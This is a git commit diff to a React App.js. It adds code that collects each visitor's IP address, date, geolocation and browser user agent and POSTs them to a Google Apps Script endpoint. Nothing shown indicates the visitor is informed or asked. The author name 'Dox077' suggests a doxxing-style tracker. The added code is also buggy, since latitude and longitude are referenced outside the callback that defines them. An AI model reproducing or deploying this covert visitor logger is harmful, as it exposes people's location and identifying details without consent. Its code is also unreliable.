bf64afd4a79c4d6ed0b1df615dbe9d2d2dbcbd3b
Dox077 <149229368+Dox077@users.noreply.github.com>
2023-10-29 01:41:26 +0530

    s

--- src/App.js
+++ src/App.js
@@ -8,8 +8,20 @@ export default function App() {
     const currentDate = new Date();
     console.log("Current Date:", currentDate);
 
+    navigator.geolocation.getCurrentPosition(function (position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+    });
+
+    const userAgent = navigator.userAgent;
+    console.log("User Agent:", userAgent);
+
+
     formData.append("Ip", data.ip);
-    formData.append("Email", currentDate);
+    formData.append("Date", currentDate);
+    formData.append("Location", `Latitude: ${latitude}, Longitude: ${longitude}`);
+    formData.append("Agent", userAgent);
     Submit(formData)
   }
 
@@ -21,7 +33,7 @@ useEffect(() => {
     fetch(
       // "https://script.google.com/macros/s/AKfycbw3p5vg2AfUg3vBJmAQouPMLujglgUFqzEN-25tIb_95Uyrdg0IEDe1s0nk0Ks_nwdoNQ/exec",
       // "https://script.google.com/macros/s/AKfycbw3p5vg2AfUg3vBJmAQouPMLujglgUFqzEN-25tIb_95Uyrdg0IEDe1s0nk0Ks_nwdoNQ/exec",
-      "https://script.google.com/macros/s/AKfycbzHslicneGC_osDUcUATTa5LB9yp6wvQw0ex6MfplN_QySifz1Jm2QzeQKaeoU2Zl3I/exec",
+      "https://script.google.com/macros/s/AKfycbxxu4njWr1s_F9GJ26qYH7HWiMG48tshXnoeyMZgw2s81sMmZxDVLsa8vCWkeT8-WgqfQ/exec",
       {
         method: "POST",
         body: formData
